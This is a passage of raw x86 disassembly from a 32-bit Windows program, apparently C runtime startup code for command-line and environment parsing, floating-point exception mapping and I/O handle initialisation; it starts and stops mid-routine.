  422da1:	pop    ecx
  422da2:	jbe    0x422dcd
  422da4:	lea    eax,[ebp-0x10c]
  422daa:	push   eax
  422dab:	call   0x423e70
  422db0:	mov    edi,eax
  422db2:	lea    eax,[ebp-0x10c]
  422db8:	sub    eax,0x3b
  422dbb:	push   0x3
  422dbd:	add    edi,eax
  422dbf:	push   0x428480
  422dc4:	push   edi
  422dc5:	call   0x423d40
  422dca:	add    esp,0x10
  422dcd:	push   edi
  422dce:	call   0x423e70
  422dd3:	push   DWORD PTR [esi+0x45c1cc]
  422dd9:	mov    ebx,eax
  422ddb:	call   0x423e70
  422de0:	lea    eax,[ebx+eax*1+0x1c]
  422de4:	pop    ecx
  422de5:	add    eax,0x3
  422de8:	pop    ecx
  422de9:	and    eax,0xfffffffc
  422dec:	call   0x4238b0
  422df1:	mov    ebx,esp
  422df3:	push   0x428464
  422df8:	push   ebx
  422df9:	call   0x423c40
  422dfe:	push   edi
  422dff:	push   ebx
  422e00:	call   0x423c50
  422e05:	push   0x428460
  422e0a:	push   ebx
  422e0b:	call   0x423c50
  422e10:	push   DWORD PTR [esi+0x45c1cc]
  422e16:	push   ebx
  422e17:	call   0x423c50
  422e1c:	push   0x12010
  422e21:	push   0x428438
  422e26:	push   ebx
  422e27:	call   0x423b42
  422e2c:	add    esp,0x2c
  422e2f:	jmp    0x422e56
  422e31:	push   edx
  422e32:	lea    eax,[ebp+0x8]
  422e35:	push   eax
  422e36:	lea    esi,[esi+0x45c1cc]
  422e3c:	push   DWORD PTR [esi]
  422e3e:	call   0x423e70
  422e43:	pop    ecx
  422e44:	push   eax
  422e45:	push   DWORD PTR [esi]
  422e47:	push   0xfffffff4
  422e49:	call   DWORD PTR ds:0x428038
  422e4f:	push   eax
  422e50:	call   DWORD PTR ds:0x428034
  422e56:	lea    esp,[ebp-0x118]
  422e5c:	mov    ecx,DWORD PTR [ebp-0x4]
  422e5f:	xor    ecx,DWORD PTR [ebp+0x4]
  422e62:	call   0x423f2c
  422e67:	pop    edi
  422e68:	pop    esi
  422e69:	pop    ebx
  422e6a:	leave  
  422e6b:	ret    
  422e6c:	mov    eax,ds:0x45cabc
  422e71:	cmp    eax,0x1
  422e74:	je     0x422e83
  422e76:	test   eax,eax
  422e78:	jne    0x422ea4
  422e7a:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422e81:	jne    0x422ea4
  422e83:	push   0xfc
  422e88:	call   0x422cf5
  422e8d:	mov    eax,ds:0x45cb08
  422e92:	test   eax,eax
  422e94:	pop    ecx
  422e95:	je     0x422e99
  422e97:	call   eax
  422e99:	push   0xff
  422e9e:	call   0x422cf5
  422ea3:	pop    ecx
  422ea4:	ret    
  422ea5:	push   ebp
  422ea6:	mov    ebp,esp
  422ea8:	push   ecx
  422ea9:	push   ebx
  422eaa:	push   esi
  422eab:	push   edi
  422eac:	call   0x42370d
  422eb1:	mov    edi,DWORD PTR [ebp+0x8]
  422eb4:	mov    esi,eax
  422eb6:	mov    edx,DWORD PTR [esi+0x54]
  422eb9:	mov    eax,ds:0x45c2dc
  422ebe:	mov    ecx,edx
  422ec0:	cmp    DWORD PTR [ecx],edi
  422ec2:	je     0x422ed1
  422ec4:	lea    ebx,[eax+eax*2]
  422ec7:	add    ecx,0xc
  422eca:	lea    ebx,[edx+ebx*4]
  422ecd:	cmp    ecx,ebx
  422ecf:	jb     0x422ec0
  422ed1:	lea    eax,[eax+eax*2]
  422ed4:	lea    eax,[edx+eax*4]
  422ed7:	cmp    ecx,eax
  422ed9:	jae    0x422edf
  422edb:	cmp    DWORD PTR [ecx],edi
  422edd:	je     0x422ee1
  422edf:	xor    ecx,ecx
  422ee1:	test   ecx,ecx
  422ee3:	je     0x422ffb
  422ee9:	mov    ebx,DWORD PTR [ecx+0x8]
  422eec:	test   ebx,ebx
  422eee:	mov    DWORD PTR [ebp+0x8],ebx
  422ef1:	je     0x422ffb
  422ef7:	cmp    ebx,0x5
  422efa:	jne    0x422f08
  422efc:	and    DWORD PTR [ecx+0x8],0x0
  422f00:	xor    eax,eax
  422f02:	inc    eax
  422f03:	jmp    0x423004
  422f08:	cmp    ebx,0x1
  422f0b:	je     0x422ff6
  422f11:	mov    eax,DWORD PTR [esi+0x58]
  422f14:	mov    DWORD PTR [ebp-0x4],eax
  422f17:	mov    eax,DWORD PTR [ebp+0xc]
  422f1a:	mov    DWORD PTR [esi+0x58],eax
  422f1d:	mov    eax,DWORD PTR [ecx+0x4]
  422f20:	cmp    eax,0x8
  422f23:	jne    0x422fe8
  422f29:	mov    edx,DWORD PTR ds:0x45c2d0
  422f2f:	mov    eax,ds:0x45c2d4
  422f34:	add    eax,edx
  422f36:	cmp    edx,eax
  422f38:	jge    0x422f61
  422f3a:	lea    eax,[edx+edx*2]
  422f3d:	shl    eax,0x2
  422f40:	mov    edi,DWORD PTR [esi+0x54]
  422f43:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f48:	mov    edi,DWORD PTR ds:0x45c2d0
  422f4e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422f54:	inc    edx
  422f55:	add    ebx,edi
  422f57:	add    eax,0xc
  422f5a:	cmp    edx,ebx
  422f5c:	jl     0x422f40
  422f5e:	mov    ebx,DWORD PTR [ebp+0x8]
  422f61:	mov    ecx,DWORD PTR [ecx]
  422f63:	cmp    ecx,0xc000008e
  422f69:	mov    edi,DWORD PTR [esi+0x5c]
  422f6c:	jne    0x422f77
  422f6e:	mov    DWORD PTR [esi+0x5c],0x83
  422f75:	jmp    0x422fdb
  422f77:	cmp    ecx,0xc0000090
  422f7d:	jne    0x422f88
  422f7f:	mov    DWORD PTR [esi+0x5c],0x81
  422f86:	jmp    0x422fdb
  422f88:	cmp    ecx,0xc0000091
  422f8e:	jne    0x422f99
  422f90:	mov    DWORD PTR [esi+0x5c],0x84
  422f97:	jmp    0x422fdb
  422f99:	cmp    ecx,0xc0000093
  422f9f:	jne    0x422faa
  422fa1:	mov    DWORD PTR [esi+0x5c],0x85
  422fa8:	jmp    0x422fdb
  422faa:	cmp    ecx,0xc000008d
  422fb0:	jne    0x422fbb
  422fb2:	mov    DWORD PTR [esi+0x5c],0x82
  422fb9:	jmp    0x422fdb
  422fbb:	cmp    ecx,0xc000008f
  422fc1:	jne    0x422fcc
  422fc3:	mov    DWORD PTR [esi+0x5c],0x86
  422fca:	jmp    0x422fdb
  422fcc:	cmp    ecx,0xc0000092
  422fd2:	jne    0x422fdb
  422fd4:	mov    DWORD PTR [esi+0x5c],0x8a
  422fdb:	push   DWORD PTR [esi+0x5c]
  422fde:	push   0x8
  422fe0:	call   ebx
  422fe2:	pop    ecx
  422fe3:	mov    DWORD PTR [esi+0x5c],edi
  422fe6:	jmp    0x422fef
  422fe8:	and    DWORD PTR [ecx+0x8],0x0
  422fec:	push   eax
  422fed:	call   ebx
  422fef:	mov    eax,DWORD PTR [ebp-0x4]
  422ff2:	pop    ecx
  422ff3:	mov    DWORD PTR [esi+0x58],eax
  422ff6:	or     eax,0xffffffff
  422ff9:	jmp    0x423004
  422ffb:	push   DWORD PTR [ebp+0xc]
  422ffe:	call   DWORD PTR ds:0x428040
  423004:	pop    edi
  423005:	pop    esi
  423006:	pop    ebx
  423007:	leave  
  423008:	ret    
  423009:	cmp    DWORD PTR ds:0x45d26c,0x0
  423010:	jne    0x423017
  423012:	call   0x42444c
  423017:	push   esi
  423018:	mov    esi,DWORD PTR ds:0x45d274
  42301e:	test   esi,esi
  423020:	jne    0x423029
  423022:	mov    esi,0x42849b
  423027:	jmp    0x42306e
  423029:	mov    al,BYTE PTR [esi]
  42302b:	cmp    al,0x22
  42302d:	jne    0x423057
  42302f:	inc    esi
  423030:	mov    al,BYTE PTR [esi]
  423032:	cmp    al,0x22
  423034:	je     0x423067
  423036:	test   al,al
  423038:	je     0x423050
  42303a:	movzx  eax,al
  42303d:	push   eax
  42303e:	call   0x423f6b
  423043:	test   eax,eax
  423045:	pop    ecx
  423046:	je     0x423049
  423048:	inc    esi
  423049:	inc    esi
  42304a:	mov    al,BYTE PTR [esi]
  42304c:	cmp    al,0x22
  42304e:	jne    0x423036
  423050:	cmp    BYTE PTR [esi],0x22
  423053:	jne    0x423068
  423055:	jmp    0x423067
  423057:	cmp    al,0x20
  423059:	jbe    0x423068
  42305b:	inc    esi
  42305c:	cmp    BYTE PTR [esi],0x20
  42305f:	ja     0x42305b
  423061:	jmp    0x423068
  423063:	cmp    al,0x20
  423065:	ja     0x42306e
  423067:	inc    esi
  423068:	mov    al,BYTE PTR [esi]
  42306a:	test   al,al
  42306c:	jne    0x423063
  42306e:	mov    eax,esi
  423070:	pop    esi
  423071:	ret    
  423072:	push   ebx
  423073:	xor    ebx,ebx
  423075:	cmp    DWORD PTR ds:0x45d26c,ebx
  42307b:	push   esi
  42307c:	push   edi
  42307d:	jne    0x423084
  42307f:	call   0x42444c
  423084:	mov    esi,DWORD PTR ds:0x45cab4
  42308a:	xor    edi,edi
  42308c:	cmp    esi,ebx
  42308e:	jne    0x4230a2
  423090:	jmp    0x4230c2
  423092:	cmp    al,0x3d
  423094:	je     0x423097
  423096:	inc    edi
  423097:	push   esi
  423098:	call   0x423e70
  42309d:	pop    ecx
  42309e:	lea    esi,[esi+eax*1+0x1]
  4230a2:	mov    al,BYTE PTR [esi]
  4230a4:	cmp    al,bl
  4230a6:	jne    0x423092
  4230a8:	lea    eax,[edi*4+0x4]
  4230af:	push   eax
  4230b0:	call   0x424582
  4230b5:	mov    edi,eax
  4230b7:	cmp    edi,ebx
  4230b9:	pop    ecx
  4230ba:	mov    DWORD PTR ds:0x45cae4,edi
  4230c0:	jne    0x4230c7
  4230c2:	or     eax,0xffffffff
  4230c5:	jmp    0x42311f
  4230c7:	mov    esi,DWORD PTR ds:0x45cab4
  4230cd:	push   ebp
  4230ce:	jmp    0x4230fa
  4230d0:	push   esi
  4230d1:	call   0x423e70
  4230d6:	mov    ebp,eax
  4230d8:	inc    ebp
  4230d9:	cmp    BYTE PTR [esi],0x3d
  4230dc:	pop    ecx
  4230dd:	je     0x4230f8
  4230df:	push   ebp
  4230e0:	call   0x424582
  4230e5:	cmp    eax,ebx
  4230e7:	pop    ecx
  4230e8:	mov    DWORD PTR [edi],eax
  4230ea:	je     0x423123
  4230ec:	push   esi
  4230ed:	push   eax
  4230ee:	call   0x423c40
  4230f3:	pop    ecx
  4230f4:	pop    ecx
  4230f5:	add    edi,0x4
  4230f8:	add    esi,ebp
  4230fa:	cmp    BYTE PTR [esi],bl
  4230fc:	jne    0x4230d0
  4230fe:	push   DWORD PTR ds:0x45cab4
  423104:	call   0x42446a
  423109:	mov    DWORD PTR ds:0x45cab4,ebx
  42310f:	mov    DWORD PTR [edi],ebx
  423111:	mov    DWORD PTR ds:0x45d260,0x1
  42311b:	xor    eax,eax
  42311d:	pop    ecx
  42311e:	pop    ebp
  42311f:	pop    edi
  423120:	pop    esi
  423121:	pop    ebx
  423122:	ret    
  423123:	push   DWORD PTR ds:0x45cae4
  423129:	call   0x42446a
  42312e:	mov    DWORD PTR ds:0x45cae4,ebx
  423134:	or     eax,0xffffffff
  423137:	jmp    0x42311d
  423139:	push   ebp
  42313a:	mov    ebp,esp
  42313c:	push   ecx
  42313d:	push   ebx
  42313e:	mov    ebx,DWORD PTR [ebp+0xc]
  423141:	xor    edx,edx
  423143:	cmp    DWORD PTR [ebp+0x8],edx
  423146:	push   edi
  423147:	mov    DWORD PTR [esi],edx
  423149:	mov    edi,ecx
  42314b:	mov    DWORD PTR [ebx],0x1
  423151:	je     0x42315c
  423153:	mov    ecx,DWORD PTR [ebp+0x8]
  423156:	add    DWORD PTR [ebp+0x8],0x4
  42315a:	mov    DWORD PTR [ecx],edi
  42315c:	cmp    BYTE PTR [eax],0x22
  42315f:	jne    0x42316f
  423161:	xor    ecx,ecx
  423163:	test   edx,edx
  423165:	sete   cl
  423168:	inc    eax
  423169:	mov    edx,ecx
  42316b:	mov    cl,0x22
  42316d:	jmp    0x42319c
  42316f:	inc    DWORD PTR [esi]
  423171:	test   edi,edi
  423173:	je     0x42317a
  423175:	mov    cl,BYTE PTR [eax]
  423177:	mov    BYTE PTR [edi],cl
  423179:	inc    edi
  42317a:	mov    cl,BYTE PTR [eax]
  42317c:	movzx  ebx,cl
  42317f:	inc    eax
  423180:	test   BYTE PTR [ebx+0x45cf21],0x4
  423187:	je     0x423195
  423189:	inc    DWORD PTR [esi]
  42318b:	test   edi,edi
  42318d:	je     0x423194
  42318f:	mov    bl,BYTE PTR [eax]
  423191:	mov    BYTE PTR [edi],bl
  423193:	inc    edi
  423194:	inc    eax
  423195:	test   cl,cl
  423197:	mov    ebx,DWORD PTR [ebp+0xc]
  42319a:	je     0x4231ce
  42319c:	test   edx,edx
  42319e:	jne    0x42315c
  4231a0:	cmp    cl,0x20
  4231a3:	je     0x4231aa
  4231a5:	cmp    cl,0x9
  4231a8:	jne    0x42315c
  4231aa:	test   edi,edi
  4231ac:	je     0x4231b2
  4231ae:	and    BYTE PTR [edi-0x1],0x0
  4231b2:	and    DWORD PTR [ebp-0x4],0x0
  4231b6:	cmp    BYTE PTR [eax],0x0
  4231b9:	je     0x423295
  4231bf:	mov    cl,BYTE PTR [eax]
  4231c1:	cmp    cl,0x20
  4231c4:	je     0x4231cb
  4231c6:	cmp    cl,0x9
  4231c9:	jne    0x4231d1
  4231cb:	inc    eax
  4231cc:	jmp    0x4231bf
  4231ce:	dec    eax
  4231cf:	jmp    0x4231b2
  4231d1:	cmp    BYTE PTR [eax],0x0
  4231d4:	je     0x423295
  4231da:	cmp    DWORD PTR [ebp+0x8],0x0
  4231de:	je     0x4231e9
  4231e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4231e3:	add    DWORD PTR [ebp+0x8],0x4
  4231e7:	mov    DWORD PTR [ecx],edi
  4231e9:	inc    DWORD PTR [ebx]
  4231eb:	xor    ebx,ebx
  4231ed:	inc    ebx
  4231ee:	xor    edx,edx
  4231f0:	jmp    0x4231f4
  4231f2:	inc    eax
  4231f3:	inc    edx
  4231f4:	cmp    BYTE PTR [eax],0x5c
  4231f7:	je     0x4231f2
  4231f9:	cmp    BYTE PTR [eax],0x22
  4231fc:	jne    0x423224
  4231fe:	test   dl,0x1
  423201:	jne    0x423222
  423203:	cmp    DWORD PTR [ebp-0x4],0x0
  423207:	je     0x423215
  423209:	lea    ecx,[eax+0x1]
  42320c:	cmp    BYTE PTR [ecx],0x22
  42320f:	jne    0x423215
  423211:	mov    eax,ecx
  423213:	jmp    0x423217
  423215:	xor    ebx,ebx
  423217:	xor    ecx,ecx
  423219:	cmp    DWORD PTR [ebp-0x4],ecx
  42321c:	sete   cl
  42321f:	mov    DWORD PTR [ebp-0x4],ecx
  423222:	shr    edx,1
  423224:	test   edx,edx
  423226:	je     0x423235
  423228:	test   edi,edi
  42322a:	je     0x423230
  42322c:	mov    BYTE PTR [edi],0x5c
  42322f:	inc    edi
  423230:	inc    DWORD PTR [esi]
  423232:	dec    edx
  423233:	jne    0x423228
  423235:	mov    cl,BYTE PTR [eax]
  423237:	test   cl,cl
  423239:	je     0x423283
  42323b:	cmp    DWORD PTR [ebp-0x4],0x0
  42323f:	jne    0x42324b
  423241:	cmp    cl,0x20
  423244:	je     0x423283
  423246:	cmp    cl,0x9
  423249:	je     0x423283
  42324b:	test   ebx,ebx
  42324d:	je     0x42327d
  42324f:	test   edi,edi
  423251:	je     0x42326c
  423253:	movzx  edx,cl
  423256:	test   BYTE PTR [edx+0x45cf21],0x4
  42325d:	je     0x423265
  42325f:	mov    BYTE PTR [edi],cl
  423261:	inc    edi
  423262:	inc    eax
  423263:	inc    DWORD PTR [esi]
  423265:	mov    cl,BYTE PTR [eax]
  423267:	mov    BYTE PTR [edi],cl
  423269:	inc    edi
  42326a:	jmp    0x42327b
  42326c:	movzx  ecx,cl
  42326f:	test   BYTE PTR [ecx+0x45cf21],0x4
  423276:	je     0x42327b
  423278:	inc    eax
  423279:	inc    DWORD PTR [esi]
  42327b:	inc    DWORD PTR [esi]
  42327d:	inc    eax
  42327e:	jmp    0x4231eb
  423283:	test   edi,edi
  423285:	je     0x42328b
  423287:	and    BYTE PTR [edi],0x0
  42328a:	inc    edi
  42328b:	inc    DWORD PTR [esi]
  42328d:	mov    ebx,DWORD PTR [ebp+0xc]
  423290:	jmp    0x4231b6
  423295:	mov    eax,DWORD PTR [ebp+0x8]
  423298:	test   eax,eax
  42329a:	je     0x42329f
  42329c:	and    DWORD PTR [eax],0x0
  42329f:	inc    DWORD PTR [ebx]
  4232a1:	pop    edi
  4232a2:	pop    ebx
  4232a3:	leave  
  4232a4:	ret    
  4232a5:	push   ebp
  4232a6:	mov    ebp,esp
  4232a8:	push   ecx
  4232a9:	push   ecx
  4232aa:	push   ebx
  4232ab:	push   esi
  4232ac:	push   edi
  4232ad:	xor    edi,edi
  4232af:	cmp    DWORD PTR ds:0x45d26c,edi
  4232b5:	jne    0x4232bc
  4232b7:	call   0x42444c
  4232bc:	and    BYTE PTR ds:0x45cc14,0x0
  4232c3:	push   0x104
  4232c8:	mov    esi,0x45cb10
  4232cd:	push   esi
  4232ce:	push   edi
  4232cf:	call   DWORD PTR ds:0x42803c
  4232d5:	mov    eax,ds:0x45d274
  4232da:	cmp    eax,edi
  4232dc:	mov    DWORD PTR ds:0x45caf4,esi
  4232e2:	je     0x4232eb
  4232e4:	cmp    BYTE PTR [eax],0x0
  4232e7:	mov    ebx,eax
  4232e9:	jne    0x4232ed
  4232eb:	mov    ebx,esi
  4232ed:	lea    eax,[ebp-0x4]
  4232f0:	push   eax
  4232f1:	push   edi
  4232f2:	lea    esi,[ebp-0x8]
  4232f5:	xor    ecx,ecx
  4232f7:	mov    eax,ebx
  4232f9:	call   0x423139
  4232fe:	mov    esi,DWORD PTR [ebp-0x4]
  423301:	mov    eax,DWORD PTR [ebp-0x8]
  423304:	shl    esi,0x2
  423307:	add    eax,esi
  423309:	push   eax
  42330a:	call   0x424582
  42330f:	mov    edi,eax
  423311:	add    esp,0xc
  423314:	test   edi,edi
  423316:	jne    0x42331d
  423318:	or     eax,0xffffffff
  42331b:	jmp    0x423342
  42331d:	lea    eax,[ebp-0x4]
  423320:	push   eax
  423321:	lea    ecx,[esi+edi*1]
  423324:	push   edi
  423325:	lea    esi,[ebp-0x8]
  423328:	mov    eax,ebx
  42332a:	call   0x423139
  42332f:	mov    eax,DWORD PTR [ebp-0x4]
  423332:	dec    eax
  423333:	pop    ecx
  423334:	mov    ds:0x45cad8,eax
  423339:	pop    ecx
  42333a:	mov    DWORD PTR ds:0x45cadc,edi
  423340:	xor    eax,eax
  423342:	pop    edi
  423343:	pop    esi
  423344:	pop    ebx
  423345:	leave  
  423346:	ret    
  423347:	push   ecx
  423348:	push   ecx
  423349:	mov    eax,ds:0x45cc18
  42334e:	push   ebx
  42334f:	push   ebp
  423350:	push   esi
  423351:	push   edi
  423352:	mov    edi,DWORD PTR ds:0x428054
  423358:	xor    ebx,ebx
  42335a:	xor    esi,esi
  42335c:	cmp    eax,ebx
  42335e:	push   0x2
  423360:	pop    ebp
  423361:	jne    0x423390
  423363:	call   edi
  423365:	mov    esi,eax
  423367:	cmp    esi,ebx
  423369:	je     0x423377
  42336b:	mov    DWORD PTR ds:0x45cc18,0x1
  423375:	jmp    0x423395
  423377:	call   DWORD PTR ds:0x428010
  42337d:	cmp    eax,0x78
  423380:	jne    0x42338b
  423382:	mov    eax,ebp
  423384:	mov    ds:0x45cc18,eax
  423389:	jmp    0x423390
  42338b:	mov    eax,ds:0x45cc18
  423390:	cmp    eax,0x1
  423393:	jne    0x423412
  423395:	cmp    esi,ebx
  423397:	jne    0x4233a1
  423399:	call   edi
  42339b:	mov    esi,eax
  42339d:	cmp    esi,ebx
  42339f:	je     0x42341a
  4233a1:	cmp    WORD PTR [esi],bx
  4233a4:	mov    eax,esi
  4233a6:	je     0x4233b6
  4233a8:	add    eax,ebp
  4233aa:	cmp    WORD PTR [eax],bx
  4233ad:	jne    0x4233a8
  4233af:	add    eax,ebp
  4233b1:	cmp    WORD PTR [eax],bx
  4233b4:	jne    0x4233a8
  4233b6:	mov    edi,DWORD PTR ds:0x428050
  4233bc:	push   ebx
  4233bd:	push   ebx
  4233be:	push   ebx
  4233bf:	sub    eax,esi
  4233c1:	push   ebx
  4233c2:	sar    eax,1
  4233c4:	inc    eax
  4233c5:	push   eax
  4233c6:	push   esi
  4233c7:	push   ebx
  4233c8:	push   ebx
  4233c9:	mov    DWORD PTR [esp+0x34],eax
  4233cd:	call   edi
  4233cf:	mov    ebp,eax
  4233d1:	cmp    ebp,ebx
  4233d3:	je     0x423407
  4233d5:	push   ebp
  4233d6:	call   0x424582
  4233db:	cmp    eax,ebx
  4233dd:	pop    ecx
  4233de:	mov    DWORD PTR [esp+0x10],eax
  4233e2:	je     0x423407
  4233e4:	push   ebx
  4233e5:	push   ebx
  4233e6:	push   ebp
  4233e7:	push   eax
  4233e8:	push   DWORD PTR [esp+0x24]
  4233ec:	push   esi
  4233ed:	push   ebx
  4233ee:	push   ebx
  4233ef:	call   edi
  4233f1:	test   eax,eax
  4233f3:	jne    0x423403
  4233f5:	push   DWORD PTR [esp+0x10]
  4233f9:	call   0x42446a
  4233fe:	pop    ecx
  4233ff:	mov    DWORD PTR [esp+0x10],ebx
  423403:	mov    ebx,DWORD PTR [esp+0x10]
  423407:	push   esi
  423408:	call   DWORD PTR ds:0x42804c
  42340e:	mov    eax,ebx
  423410:	jmp    0x423462
  423412:	cmp    eax,ebp
  423414:	je     0x42341e
  423416:	cmp    eax,ebx
  423418:	je     0x42341e
  42341a:	xor    eax,eax
  42341c:	jmp    0x423462
  42341e:	call   DWORD PTR ds:0x428048
  423424:	mov    esi,eax
  423426:	cmp    esi,ebx
  423428:	je     0x42341a
  42342a:	cmp    BYTE PTR [esi],bl
  42342c:	je     0x423438
  42342e:	inc    eax
  42342f:	cmp    BYTE PTR [eax],bl
  423431:	jne    0x42342e
  423433:	inc    eax
  423434:	cmp    BYTE PTR [eax],bl
  423436:	jne    0x42342e
  423438:	sub    eax,esi
  42343a:	inc    eax
  42343b:	mov    ebp,eax
  42343d:	push   ebp
  42343e:	call   0x424582
  423443:	mov    edi,eax
  423445:	cmp    edi,ebx
  423447:	pop    ecx
  423448:	jne    0x42344e
  42344a:	xor    edi,edi
  42344c:	jmp    0x423459
  42344e:	push   ebp
  42344f:	push   esi
  423450:	push   edi
  423451:	call   0x4245a0
  423456:	add    esp,0xc
  423459:	push   esi
  42345a:	call   DWORD PTR ds:0x428044
  423460:	mov    eax,edi
  423462:	pop    edi
  423463:	pop    esi
  423464:	pop    ebp
  423465:	pop    ebx
  423466:	pop    ecx
  423467:	pop    ecx
  423468:	ret    
  423469:	sub    esp,0x48
  42346c:	push   ebx
  42346d:	mov    ebx,0x480
  423472:	push   ebx
  423473:	call   0x424582
  423478:	test   eax,eax
  42347a:	pop    ecx
  42347b:	jne    0x423485
  42347d:	or     eax,0xffffffff
  423480:	jmp    0x423662
  423485:	mov    ds:0x45d160,eax
  42348a:	mov    DWORD PTR ds:0x45d148,0x20
  423494:	lea    ecx,[eax+0x480]
  42349a:	jmp    0x4234ba
  42349c:	and    BYTE PTR [eax+0x4],0x0
  4234a0:	or     DWORD PTR [eax],0xffffffff
  4234a3:	and    DWORD PTR [eax+0x8],0x0
  4234a7:	mov    BYTE PTR [eax+0x5],0xa
  4234ab:	mov    ecx,DWORD PTR ds:0x45d160
  4234b1:	add    eax,0x24
  4234b4:	add    ecx,0x480
  4234ba:	cmp    eax,ecx
  4234bc:	jb     0x42349c
  4234be:	push   ebp
  4234bf:	push   esi
  4234c0:	push   edi
  4234c1:	lea    eax,[esp+0x14]
  4234c5:	push   eax
  4234c6:	call   DWORD PTR ds:0x42801c
  4234cc:	cmp    WORD PTR [esp+0x46],0x0
  4234d2:	je     0x4235c1
  4234d8:	mov    eax,DWORD PTR [esp+0x48]
  4234dc:	test   eax,eax
  4234de:	je     0x4235c1
  4234e4:	mov    edi,DWORD PTR [eax]
  4234e6:	lea    ebp,[eax+0x4]
  4234e9:	lea    eax,[edi+ebp*1]
  4234ec:	mov    DWORD PTR [esp+0x10],eax
  4234f0:	mov    eax,0x800
  4234f5:	cmp    edi,eax
  4234f7:	jl     0x4234fb
  4234f9:	mov    edi,eax
  4234fb:	cmp    DWORD PTR ds:0x45d148,edi
  423501:	jge    0x423551
  423503:	mov    esi,0x45d164
  423508:	push   ebx
  423509:	call   0x424582
  42350e:	test   eax,eax
  423510:	pop    ecx
  423511:	je     0x42354b
  423513:	add    DWORD PTR ds:0x45d148,0x20
  42351a:	mov    DWORD PTR [esi],eax
  42351c:	lea    ecx,[eax+0x480]
  423522:	jmp    0x42353a
  423524:	and    BYTE PTR [eax+0x4],0x0
  423528:	or     DWORD PTR [eax],0xffffffff
  42352b:	and    DWORD PTR [eax+0x8],0x0
  42352f:	mov    BYTE PTR [eax+0x5],0xa
  423533:	mov    ecx,DWORD PTR [esi]
  423535:	add    eax,0x24
  423538:	add    ecx,ebx
  42353a:	cmp    eax,ecx
  42353c:	jb     0x423524
  42353e:	add    esi,0x4
  423541:	cmp    DWORD PTR ds:0x45d148,edi
  423547:	jl     0x423508
  423549:	jmp    0x423551
  42354b:	mov    edi,DWORD PTR ds:0x45d148
  423551:	xor    ebx,ebx
  423553:	test   edi,edi
  423555:	jle    0x4235c1
  423557:	mov    eax,DWORD PTR [esp+0x10]
  42355b:	mov    eax,DWORD PTR [eax]
  42355d:	cmp    eax,0xffffffff
  423560:	je     0x4235b6
  423562:	mov    cl,BYTE PTR [ebp+0x0]
  423565:	test   cl,0x1
  423568:	je     0x4235b6
  42356a:	test   cl,0x8
  42356d:	jne    0x42357a
  42356f:	push   eax
  423570:	call   DWORD PTR ds:0x42805c
  423576:	test   eax,eax
  423578:	je     0x4235b6
  42357a:	mov    ecx,ebx
  42357c:	mov    eax,ebx
  42357e:	and    eax,0x1f
  423581:	lea    eax,[eax+eax*8]
  423584:	sar    ecx,0x5
  423587:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  42358e:	lea    esi,[ecx+eax*4]
  423591:	mov    eax,DWORD PTR [esp+0x10]
  423595:	mov    eax,DWORD PTR [eax]
  423597:	mov    DWORD PTR [esi],eax
  423599:	mov    al,BYTE PTR [ebp+0x0]
  42359c:	mov    BYTE PTR [esi+0x4],al
  42359f:	lea    eax,[esi+0xc]
  4235a2:	push   0xfa0
  4235a7:	push   eax
  4235a8:	call   0x4248ed
  4235ad:	test   eax,eax
  4235af:	pop    ecx
  4235b0:	pop    ecx
  4235b1:	je     0x4235e1
  4235b3:	inc    DWORD PTR [esi+0x8]
  4235b6:	add    DWORD PTR [esp+0x10],0x4
  4235bb:	inc    ebx
  4235bc:	inc    ebp
  4235bd:	cmp    ebx,edi
  4235bf:	jl     0x423557
  4235c1:	xor    ebx,ebx
  4235c3:	mov    ecx,DWORD PTR ds:0x45d160
  4235c9:	lea    eax,[ebx+ebx*8]
  4235cc:	lea    esi,[ecx+eax*4]
  4235cf:	cmp    DWORD PTR [esi],0xffffffff
  4235d2:	jne    0x423643
  4235d4:	test   ebx,ebx
  4235d6:	mov    BYTE PTR [esi+0x4],0x81
  4235da:	jne    0x4235e6
  4235dc:	push   0xfffffff6
  4235de:	pop    eax
  4235df:	jmp    0x4235f0
  4235e1:	or     eax,0xffffffff
  4235e4:	jmp    0x42365f
  4235e6:	mov    eax,ebx
  4235e8:	dec    eax
  4235e9:	neg    eax
  4235eb:	sbb    eax,eax
  4235ed:	add    eax,0xfffffff5
  4235f0:	push   eax
  4235f1:	call   DWORD PTR ds:0x428038
  4235f7:	mov    edi,eax
  4235f9:	cmp    edi,0xffffffff
  4235fc:	je     0x42363d
  4235fe:	push   edi
  4235ff:	call   DWORD PTR ds:0x42805c
  423605:	test   eax,eax
  423607:	je     0x42363d
  423609:	and    eax,0xff
  42360e:	cmp    eax,0x2
  423611:	mov    DWORD PTR [esi],edi
  423613:	jne    0x42361b
  423615:	or     BYTE PTR [esi+0x4],0x40
  423619:	jmp    0x423624
  42361b:	cmp    eax,0x3
  42361e:	jne    0x423624
  423620:	or     BYTE PTR [esi+0x4],0x8
  423624:	lea    eax,[esi+0xc]
  423627:	push   0xfa0
  42362c:	push   eax
  42362d:	call   0x4248ed
  423632:	test   eax,eax
  423634:	pop    ecx
  423635:	pop    ecx
  423636:	je     0x4235e1
  423638:	inc    DWORD PTR [esi+0x8]
  42363b:	jmp    0x423647
  42363d:	or     BYTE PTR [esi+0x4],0x40
  423641:	jmp    0x423647
  423643:	or     BYTE PTR [esi+0x4],0x80
  423647:	inc    ebx
  423648:	cmp    ebx,0x3
  42364b:	jl     0x4235c3
  423651:	push   DWORD PTR ds:0x45d148
  423657:	call   DWORD PTR ds:0x428058
  42365d:	xor    eax,eax
  42365f:	pop    edi
  423660:	pop    esi
  423661:	pop    ebp
  423662:	pop    ebx
  423663:	add    esp,0x48
  423666:	ret    
  423667:	push   0xc
  423669:	push   0x4284a0
  42366e:	call   0x423858
  423673:	mov    DWORD PTR [ebp-0x1c],0x428ef8
  42367a:	cmp    DWORD PTR [ebp-0x1c],0x428ef8
  423681:	jae    0x4236a5
  423683:	and    DWORD PTR [ebp-0x4],0x0
  423687:	mov    eax,DWORD PTR [ebp-0x1c]
  42368a:	mov    eax,DWORD PTR [eax]
  42368c:	test   eax,eax
  42368e:	je     0x42369b
  423690:	call   eax
  423692:	jmp    0x42369b
  423694:	xor    eax,eax
  423696:	inc    eax
  423697:	ret    
  423698:	mov    esp,DWORD PTR [ebp-0x18]
  42369b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42369f:	add    DWORD PTR [ebp-0x1c],0x4
